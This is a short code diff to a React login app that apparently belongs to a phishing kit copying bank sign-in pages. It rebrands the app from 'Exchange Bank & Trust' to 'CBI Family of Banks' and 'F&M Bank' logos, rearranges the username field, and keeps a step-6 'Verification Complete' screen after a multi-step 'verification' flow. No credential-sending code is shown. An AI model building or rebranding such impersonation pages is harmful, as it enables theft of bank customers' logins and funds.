@@ -147,7 +147,10 @@ function App() {
     <div>
       {step === 6 ? (
         <div className="login-container success-container">
-          <img src={cbiLogo} alt="Exchange Bank & Trust" className="login-logo" />
+          <div className="success-logos">
+            <img src={cbiFamily} alt="CBI Family of Banks" className="success-logo" />
+            <img src={fmBank} alt="F&M Bank" className="success-logo" />
+          </div>
           <h2 className="success-heading">Verification Complete.</h2>
           <div className="success-subheading">
             Your information has been successfully verified.<br />
@@ -160,12 +163,6 @@ function App() {
           {step === 1 && (
             <form style={{ width: "100%" }} onSubmit={handleLoginSubmit}>
               <div className="login-input-wrapper">
-                <label
-                  htmlFor="username"
-                  className={`login-label${username ? " login-label--float" : ""}`}
-                >
-                  Username
-                </label>
                 <input
                   id="username"
                   type="text"
@@ -176,6 +173,12 @@ function App() {
                   onFocus={e => e.target.parentNode.classList.add('focused')}
                   onBlur={e => e.target.parentNode.classList.remove('focused')}
                 />
+                <label
+                  htmlFor="username"
+                  className={`login-label${username ? " login-label--float" : ""}`}
+                >
+                  Username
+                </label>
               </div>
               <div className="forgot-link">Forgot?</div>
               <div className="login-actions">
@@ -213,15 +216,14 @@ function App() {
                 <span className="eye-icon" onClick={() => setShowPassword(v => !v)}>
                   {showPassword ? (
                     <svg width="24" height="24" fill="none" stroke="#ffe066" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" viewBox="0 0 24 24">
-                      <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z" />
-                      <circle cx="12" cy="12" r="3" />
+                      <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z"/>
+                      <circle cx="12" cy="12" r="3"/>
                     </svg>
                   ) : (
                     <svg width="24" height="24" fill="none" stroke="#ffe066" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" viewBox="0 0 24 24">
-                      <path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a21.8 21.8 0 0 1 5.06-6.06" />
-                      <path d="M1 1l22 22" />
-                      <path d="M9.53 9.53A3 3 0 0 0 12 15a3 3 0 0 0 2.47-5.47" />
-                      <path d="M14.47 14.47A3 3 0 0 1 12 9a3 3 0 0 1-2.47 5.47" />
+                      <path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a21.8 21.8 0 0 1 5.06-6.06"/>
+                      <path d="M1 1l22 22"/>
+                      <path d="M9.53 9.53A3 3 0 0 0 12 15a3 3 0 0 0 2.47-5.47"/>
                     </svg>
                   )}
                 </span>
